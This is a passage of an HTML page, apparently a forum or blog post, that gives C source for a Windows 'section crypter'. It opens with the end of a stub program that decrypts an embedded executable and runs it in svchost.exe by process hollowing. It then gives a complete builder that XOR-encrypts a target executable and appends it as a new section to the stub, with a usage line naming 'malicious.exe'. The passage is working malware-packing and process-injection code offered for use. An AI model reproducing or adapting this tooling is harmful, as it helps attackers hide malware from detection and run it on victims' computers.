printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;mark&nbsp;memory&nbsp;as&nbsp;executable:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[+]&nbsp;marked&nbsp;memory&nbsp;as&nbsp;EXECUTE_READWRITE&nbsp;\n&quot;);<br />	xor_data(pe,&nbsp;pe_size);<br />	printf(&quot;[+]&nbsp;decrypted&nbsp;PE&nbsp;\n&quot;);<br /><br />	/*<br />	Execute&nbsp;PE&nbsp;via&nbsp;process&nbsp;hollowing<br />	A&nbsp;32bit&nbsp;version&nbsp;of&nbsp;this&nbsp;binary&nbsp;will&nbsp;open&nbsp;a&nbsp;32bit&nbsp;svchost.exe<br />	A&nbsp;64bit&nbsp;version&nbsp;will&nbsp;open&nbsp;a&nbsp;64bit&nbsp;svchost.exe<br />	*/<br />	char&nbsp;target_process[]&nbsp;=&nbsp;&quot;C:\\Windows\\System32\\svchost.exe&quot;;<br />	printf(&quot;[*]&nbsp;process&nbsp;hollowing...&nbsp;\n&quot;);<br />	ProcessHollow(pe,&nbsp;target_process);<br />	<br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><strong><h3>### Builder</h3></strong><br /><div class="codebox"><div class="codebox">/*<br />#&nbsp;section_crypter&nbsp;Builder<br />Open&nbsp;a&nbsp;PE&nbsp;file&nbsp;and&nbsp;add&nbsp;a&nbsp;section&nbsp;to&nbsp;it.<br />Write&nbsp;out&nbsp;the&nbsp;modified&nbsp;PE&nbsp;to&nbsp;a&nbsp;new&nbsp;file.<br /><br />*/<br /><br />#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br /><br />#define&nbsp;SECTION_NAME&nbsp;&quot;.tie&quot;<br /><br />/*<br />Make&nbsp;sure&nbsp;to&nbsp;call&nbsp;free(file_buffer)&nbsp;after&nbsp;you&#39;re&nbsp;done.<br />*/<br />void*&nbsp;ReadFileIntoBuffer(char*&nbsp;file_name,&nbsp;OUT&nbsp;DWORD*&nbsp;file_buffer_size)<br />{<br />	void*&nbsp;file_buffer&nbsp;=&nbsp;NULL;<br />	BOOL&nbsp;b&nbsp;=&nbsp;TRUE;<br />	HANDLE&nbsp;h_file&nbsp;=&nbsp;NULL;<br />	DWORD&nbsp;file_size&nbsp;=&nbsp;0;<br /><br />	//&nbsp;Open&nbsp;target&nbsp;file<br />	h_file&nbsp;=&nbsp;CreateFileA(file_name,&nbsp;GENERIC_READ&nbsp;|&nbsp;GENERIC_WRITE,&nbsp;0,&nbsp;NULL,&nbsp;OPEN_EXISTING,&nbsp;FILE_ATTRIBUTE_NORMAL,&nbsp;NULL);<br />	if&nbsp;(h_file&nbsp;==&nbsp;INVALID_HANDLE_VALUE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;open&nbsp;target&nbsp;file:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		goto&nbsp;cleanup;<br />	}<br /><br />	//&nbsp;Get&nbsp;file&nbsp;size<br />	file_size&nbsp;=&nbsp;GetFileSize(h_file,&nbsp;NULL);<br />	(*file_buffer_size)&nbsp;=&nbsp;file_size;<br /><br />	//&nbsp;Create&nbsp;buffer&nbsp;to&nbsp;read&nbsp;file&nbsp;into<br />	file_buffer&nbsp;=&nbsp;malloc(file_size);<br /><br />	//&nbsp;Read&nbsp;file&nbsp;into&nbsp;buffer<br />	b&nbsp;=&nbsp;ReadFile(h_file,&nbsp;file_buffer,&nbsp;file_size,&nbsp;NULL,&nbsp;NULL);<br />	if&nbsp;(b&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;read&nbsp;file&nbsp;into&nbsp;buffer:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		free(file_buffer);<br />		goto&nbsp;cleanup;<br />	}<br /><br />cleanup:<br />	if&nbsp;(h_file)&nbsp;CloseHandle(h_file);<br /><br />	return&nbsp;file_buffer;<br />}<br /><br />/*<br />Null&nbsp;preserving&nbsp;XOR&nbsp;function&nbsp;to&nbsp;encrypt/decrypt&nbsp;bytes.<br />*/<br />void&nbsp;xor_bytes(unsigned&nbsp;char*&nbsp;data,&nbsp;int&nbsp;data_size)<br />{<br />	char&nbsp;key[]&nbsp;=&nbsp;{&nbsp;&#39;t&#39;,&nbsp;&#39;i&#39;,&nbsp;&#39;e&#39;&nbsp;};<br />	int&nbsp;key_len&nbsp;=&nbsp;sizeof(key);<br /><br />	for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;data_size;&nbsp;i++)<br />	{<br />		if&nbsp;((data[i]&nbsp;==&nbsp;0x00)&nbsp;||&nbsp;(data[i]&nbsp;==&nbsp;key[i&nbsp;%&nbsp;key_len]))<br />			continue;<br />		else<br />			data[i]&nbsp;^=&nbsp;key[i&nbsp;%&nbsp;key_len];<br />	}<br /><br />	return;<br />}<br /><br />DWORD&nbsp;align(DWORD&nbsp;curr_value,&nbsp;DWORD&nbsp;align_value,&nbsp;size_t&nbsp;target_addr)<br />{<br />	if&nbsp;(!(curr_value&nbsp;%&nbsp;align_value))<br />		return&nbsp;target_addr&nbsp;+&nbsp;curr_value;<br /><br />	return&nbsp;target_addr&nbsp;+&nbsp;(curr_value&nbsp;/&nbsp;align_value&nbsp;+&nbsp;1)&nbsp;*&nbsp;align_value;<br />}<br /><br />/*<br />Add&nbsp;a&nbsp;new&nbsp;section&nbsp;to&nbsp;the&nbsp;end&nbsp;of&nbsp;a&nbsp;PE&nbsp;file<br />and&nbsp;write&nbsp;the&nbsp;modified&nbsp;PE&nbsp;out&nbsp;to&nbsp;a&nbsp;new&nbsp;file.<br />Written&nbsp;as&nbsp;1&nbsp;large&nbsp;function&nbsp;because&nbsp;it&nbsp;makes&nbsp;resizing&nbsp;the&nbsp;PE&nbsp;buffer&nbsp;to&nbsp;store&nbsp;the&nbsp;new&nbsp;data&nbsp;easier.<br /><br />Parameters:<br />	char*&nbsp;pe_infile&nbsp;-&nbsp;file&nbsp;path&nbsp;to&nbsp;the&nbsp;PE&nbsp;file&nbsp;to&nbsp;open<br />	char*&nbsp;pe_outfile&nbsp;-&nbsp;path&nbsp;of&nbsp;the&nbsp;new&nbsp;PE&nbsp;to&nbsp;write&nbsp;out<br />	void*&nbsp;data_buf&nbsp;-&nbsp;the&nbsp;data&nbsp;to&nbsp;add&nbsp;to&nbsp;the&nbsp;section<br />	DWORD&nbsp;data_size&nbsp;-&nbsp;the&nbsp;size&nbsp;of&nbsp;the&nbsp;data&nbsp;to&nbsp;add<br />	char*&nbsp;new_sectionname&nbsp;-&nbsp;name&nbsp;of&nbsp;the&nbsp;new&nbsp;section<br />*/<br />BOOL&nbsp;AppendSectionToPEFile(char*&nbsp;pe_infile,&nbsp;char*&nbsp;pe_outfile,&nbsp;char*&nbsp;data_buf,&nbsp;DWORD&nbsp;data_size,&nbsp;char*&nbsp;new_sectionname)<br />{<br />	BOOL&nbsp;ok&nbsp;=&nbsp;TRUE;<br />	BOOL&nbsp;b&nbsp;=&nbsp;FALSE;<br /><br />	//&nbsp;Open&nbsp;target&nbsp;PE&nbsp;file&nbsp;&amp;&nbsp;read&nbsp;into&nbsp;buffer<br />	HANDLE&nbsp;h_infile&nbsp;=&nbsp;NULL;<br />	HANDLE&nbsp;h_outfile&nbsp;=&nbsp;NULL;<br />	DWORD&nbsp;pe_size&nbsp;=&nbsp;0;<br />	void*&nbsp;pe_buf&nbsp;=&nbsp;NULL;<br /><br />	h_infile&nbsp;=&nbsp;CreateFileA(pe_infile,&nbsp;GENERIC_READ&nbsp;|&nbsp;GENERIC_WRITE,&nbsp;0,&nbsp;NULL,&nbsp;OPEN_EXISTING,&nbsp;FILE_ATTRIBUTE_NORMAL,&nbsp;NULL);<br />	if&nbsp;(h_infile&nbsp;==&nbsp;INVALID_HANDLE_VALUE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;open&nbsp;target&nbsp;PE&nbsp;file:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		ok&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br /><br />	pe_size&nbsp;=&nbsp;GetFileSize(h_infile,&nbsp;NULL);<br />	pe_buf&nbsp;=&nbsp;malloc(pe_size);<br />	b&nbsp;=&nbsp;ReadFile(h_infile,&nbsp;pe_buf,&nbsp;pe_size,&nbsp;NULL,&nbsp;NULL);<br />	if&nbsp;(b&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;read&nbsp;file&nbsp;into&nbsp;buffer:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		ok&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br /><br />	//&nbsp;Check&nbsp;it&#39;s&nbsp;a&nbsp;valid&nbsp;PE<br />	PIMAGE_DOS_HEADER&nbsp;dos_header&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)pe_buf;<br />	PIMAGE_NT_HEADERS&nbsp;pe_header&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((size_t)pe_buf&nbsp;+&nbsp;dos_header-&gt;e_lfanew);<br />	PIMAGE_SECTION_HEADER&nbsp;section&nbsp;=&nbsp;IMAGE_FIRST_SECTION(pe_header);<br />	PIMAGE_SECTION_HEADER&nbsp;last_section&nbsp;=&nbsp;(IMAGE_FIRST_SECTION(pe_header)&nbsp;+&nbsp;pe_header-&gt;FileHeader.NumberOfSections)&nbsp;-&nbsp;1;<br />	PIMAGE_SECTION_HEADER&nbsp;new_section&nbsp;=&nbsp;last_section&nbsp;+&nbsp;1;<br /><br />	if&nbsp;(dos_header-&gt;e_magic&nbsp;!=&nbsp;IMAGE_DOS_SIGNATURE)<br />	{<br />		printf(&quot;[-]&nbsp;PE&nbsp;infile&nbsp;not&nbsp;a&nbsp;valid&nbsp;DOS&nbsp;file&nbsp;\n&quot;);<br />		goto&nbsp;cleanup;<br />	}<br />	if&nbsp;(pe_header-&gt;Signature&nbsp;!=&nbsp;IMAGE_NT_SIGNATURE)<br />	{<br />		printf(&quot;[-]&nbsp;infile&nbsp;is&nbsp;not&nbsp;a&nbsp;valid&nbsp;PE&nbsp;file&nbsp;\n&quot;);<br />		goto&nbsp;cleanup;<br />	}<br /><br />	//&nbsp;Write&nbsp;new&nbsp;section&nbsp;info&nbsp;into&nbsp;PE&nbsp;header<br />	memset(new_section,&nbsp;0,&nbsp;sizeof(IMAGE_SECTION_HEADER));<br />	memcpy_s(new_section-&gt;Name,&nbsp;8,&nbsp;new_sectionname,&nbsp;8);		//&nbsp;max&nbsp;section&nbsp;name&nbsp;length&nbsp;is&nbsp;8&nbsp;bytes<br />	new_section-&gt;Misc.VirtualSize&nbsp;=&nbsp;align(data_size,&nbsp;pe_header-&gt;OptionalHeader.SectionAlignment,&nbsp;0);<br />	new_section-&gt;VirtualAddress&nbsp;=&nbsp;align(last_section-&gt;Misc.VirtualSize,&nbsp;pe_header-&gt;OptionalHeader.SectionAlignment,&nbsp;last_section-&gt;VirtualAddress);<br />	new_section-&gt;SizeOfRawData&nbsp;=&nbsp;align(data_size,&nbsp;pe_header-&gt;OptionalHeader.FileAlignment,&nbsp;0);<br />	new_section-&gt;PointerToRawData&nbsp;=&nbsp;align(last_section-&gt;SizeOfRawData,&nbsp;pe_header-&gt;OptionalHeader.FileAlignment,&nbsp;last_section-&gt;PointerToRawData);<br />	new_section-&gt;Characteristics&nbsp;=&nbsp;IMAGE_SCN_CNT_INITIALIZED_DATA&nbsp;|&nbsp;IMAGE_SCN_MEM_READ;;<br /><br />	//&nbsp;Update&nbsp;PE&nbsp;header&nbsp;with&nbsp;+1&nbsp;section&nbsp;and&nbsp;increased&nbsp;size<br />	pe_header-&gt;FileHeader.NumberOfSections&nbsp;+=&nbsp;1;<br />	pe_header-&gt;OptionalHeader.SizeOfImage&nbsp;=&nbsp;pe_header-&gt;OptionalHeader.SizeOfImage&nbsp;+&nbsp;data_size;<br /><br />	/*<br />	Resize&nbsp;PE&nbsp;buffer&nbsp;to&nbsp;store&nbsp;new&nbsp;data<br />	New&nbsp;size&nbsp;should&nbsp;be&nbsp;(pe_size&nbsp;+&nbsp;data_size&nbsp;after&nbsp;alignment)<br />	(pe_size&nbsp;+&nbsp;data_size)&nbsp;doesn&#39;t&nbsp;allocate&nbsp;enough&nbsp;space.<br />	Therefore,&nbsp;SizeOfRawData&nbsp;is&nbsp;used&nbsp;because&nbsp;it&#39;s&nbsp;aligned.<br />	*/<br />	DWORD&nbsp;final_pe_size&nbsp;=&nbsp;pe_size&nbsp;+&nbsp;new_section-&gt;SizeOfRawData;<br />	void*&nbsp;tmp_pointer&nbsp;=&nbsp;realloc(pe_buf,&nbsp;final_pe_size);<br />	if&nbsp;(tmp_pointer&nbsp;==&nbsp;NULL)<br />		goto&nbsp;cleanup;<br />	else<br />		pe_buf&nbsp;=&nbsp;tmp_pointer;<br /><br />	//&nbsp;Write&nbsp;data&nbsp;into&nbsp;new&nbsp;section<br />	void*&nbsp;rawdata_addr&nbsp;=&nbsp;(void*)((size_t)pe_buf&nbsp;+&nbsp;new_section-&gt;PointerToRawData);<br />	memset(rawdata_addr,&nbsp;0,&nbsp;new_section-&gt;SizeOfRawData);<br />	memcpy_s(rawdata_addr,&nbsp;new_section-&gt;SizeOfRawData,&nbsp;data_buf,&nbsp;data_size);<br /><br />	//&nbsp;Write&nbsp;buffer&nbsp;out&nbsp;to&nbsp;new&nbsp;file<br />	h_outfile&nbsp;=&nbsp;CreateFileA(pe_outfile,&nbsp;GENERIC_READ&nbsp;|&nbsp;GENERIC_WRITE,&nbsp;0,&nbsp;NULL,&nbsp;CREATE_ALWAYS,&nbsp;FILE_ATTRIBUTE_NORMAL,&nbsp;NULL);<br />	if&nbsp;(h_outfile&nbsp;==&nbsp;INVALID_HANDLE_VALUE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;create&nbsp;output&nbsp;file:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		ok&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br /><br />	DWORD&nbsp;bytes_written&nbsp;=&nbsp;0;<br />	b&nbsp;=&nbsp;WriteFile(h_outfile,&nbsp;pe_buf,&nbsp;final_pe_size,&nbsp;&amp;bytes_written,&nbsp;NULL);<br />	if&nbsp;(b&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;write&nbsp;buffer&nbsp;out&nbsp;to&nbsp;file:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		ok&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br /><br />cleanup:<br />	if&nbsp;(h_infile)&nbsp;CloseHandle(h_infile);<br />	if&nbsp;(h_outfile)&nbsp;CloseHandle(h_outfile);<br />	if&nbsp;(pe_buf)&nbsp;free(pe_buf);<br /><br />	return&nbsp;ok;<br />}<br /><br />int&nbsp;main(int&nbsp;argc,&nbsp;char*&nbsp;argv[])<br /><span style="color:#000000;font-weight:400">{</span><br />	BOOL&nbsp;b&nbsp;=&nbsp;FALSE;<br /><br />	printf(&quot;#&nbsp;SECTION&nbsp;CRYPTER&nbsp;-&nbsp;builder&nbsp;\n&quot;);<br />	printf(&quot;-&nbsp;if&nbsp;crypting&nbsp;a&nbsp;32bit&nbsp;.exe,&nbsp;use&nbsp;the&nbsp;32bit&nbsp;builder&nbsp;and&nbsp;32bit&nbsp;base.exe&nbsp;\n&quot;);<br />	printf(&quot;-&nbsp;if&nbsp;crypting&nbsp;a&nbsp;64bit&nbsp;.exe,&nbsp;use&nbsp;the&nbsp;64bit&nbsp;builder&nbsp;and&nbsp;64bit&nbsp;base.exe&nbsp;\n\n&quot;);<br /><br />	if&nbsp;(argc&nbsp;!=&nbsp;4)<br />	{<br />		printf(&quot;[!]&nbsp;not&nbsp;enough&nbsp;arguments&nbsp;\n&quot;);<br />		printf(&quot;usage:&nbsp;&lt;/path/to/target/pe.exe&gt;&nbsp;&lt;/path/to/base.exe&gt;&nbsp;&lt;/path/to/outfile.exe&gt;&nbsp;\n&quot;);<br />		printf(&quot;examp:&nbsp;malicious.exe&nbsp;base.exe&nbsp;C:\\Users\\Bob\\Desktop\\crypted.exe&nbsp;\n&quot;);<br />		return&nbsp;1;<br />	}<br /><br />	char*&nbsp;crypt_target&nbsp;=&nbsp;argv[1];<br />	char*&nbsp;base_file&nbsp;=&nbsp;argv[2];<br />	char*&nbsp;outfile&nbsp;=&nbsp;argv[3];<br />	<br />	DWORD&nbsp;data_size&nbsp;=&nbsp;0;<br />	void*&nbsp;data&nbsp;=&nbsp;ReadFileIntoBuffer(crypt_target,&nbsp;&amp;data_size);<br />	if&nbsp;(data&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;read&nbsp;file&nbsp;to&nbsp;be&nbsp;crypted&nbsp;into&nbsp;buffer&nbsp;\n&quot;);<br />		return&nbsp;1;<br />	}<br /><br />	xor_bytes(data,&nbsp;data_size);<br /><br />	b&nbsp;=&nbsp;AppendSectionToPEFile(base_file,&nbsp;outfile,&nbsp;data,&nbsp;data_size,&nbsp;SECTION_NAME);<br />	if&nbsp;(b&nbsp;==&nbsp;FALSE)<br />		return&nbsp;1;<br /><br />	printf(&quot;[+]&nbsp;done!&nbsp;\n&quot;);<br />	printf(&quot;[*]&nbsp;added&nbsp;%s&nbsp;to&nbsp;%s&nbsp;\n&quot;,&nbsp;SECTION_NAME,&nbsp;outfile);<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div></div>
</body>
</html>
